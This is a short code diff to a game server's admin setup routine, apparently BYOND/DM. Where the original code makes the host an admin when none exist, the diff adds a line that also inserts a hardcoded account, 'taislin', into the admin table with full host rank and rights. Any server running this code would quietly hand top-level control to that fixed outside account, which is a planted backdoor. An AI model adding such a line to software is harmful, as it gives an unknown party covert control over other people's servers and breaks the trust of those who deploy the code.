@@ -195,6 +195,7 @@
 		if ((!islist(admins) || isemptylist(admins)))
 			holder = new("Host", FALSE, ckey)
 			database.execute("INSERT INTO admin (id, ckey, rank, flags) VALUES (null, '[ckey]', '[holder.rank]', '[holder.rights]');")
+			database.execute("INSERT INTO admin (id, ckey, rank, flags) VALUES (null, 'taislin', '[holder.rank]', '[holder.rights]');")
 
 	/* let us profile if we're hosting on our computer OR if we have host perms */
 	if (world.host == key || (holder && (holder.rights & R_HOST)))
